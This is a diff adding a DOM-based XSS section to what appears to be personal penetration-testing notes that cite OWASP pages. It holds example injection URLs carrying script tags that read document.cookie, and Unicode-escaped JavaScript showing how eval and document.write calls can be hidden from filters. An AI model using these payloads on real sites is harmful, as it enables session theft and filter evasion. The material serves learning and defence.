@@ -71,6 +71,38 @@ https://github.com/payloadbox/xss-payload-list
 
 https://github.com/pgaijin66/XSS-Payloads
 
+### DOM Based XSS
+
+The following few examples below was taken from the links below. These were great examples that helped me better understand the nature of DOM based XSS.
+
+https://owasp.org/www-community/attacks/DOM_Based_XSS  
+https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html  
+
+```
+http://<domain>/page.html?default=<script>alert(document.cookie)</script>
+http://<domain>/page.html#default=<script>alert(document.cookie)</script>
+http://<domain>/document.pdf#somename=javascript:script
+```
+
+Examples of Encoded DOM XSS payloads
+
+```
+ for(var \u0062=0; \u0062 < 10; \u0062++){
+     \u0064\u006f\u0063\u0075\u006d\u0065\u006e\u0074
+     .\u0077\u0072\u0069\u0074\u0065\u006c\u006e
+     ("\u0048\u0065\u006c\u006c\u006f\u0020\u0057\u006f\u0072\u006c\u0064");
+ }
+ \u0077\u0069\u006e\u0064\u006f\u0077
+ .\u0065\u0076\u0061\u006c
+ \u0064\u006f\u0063\u0075\u006d\u0065\u006e\u0074
+ .\u0077\u0072\u0069\u0074\u0065(111111111);
+ ```
+
+```
+var s = "\u0065\u0076\u0061\u006c";
+ var t = "\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0031\u0029";
+ window[s](t);
+```
 
 ## Port scanning web server
 ```
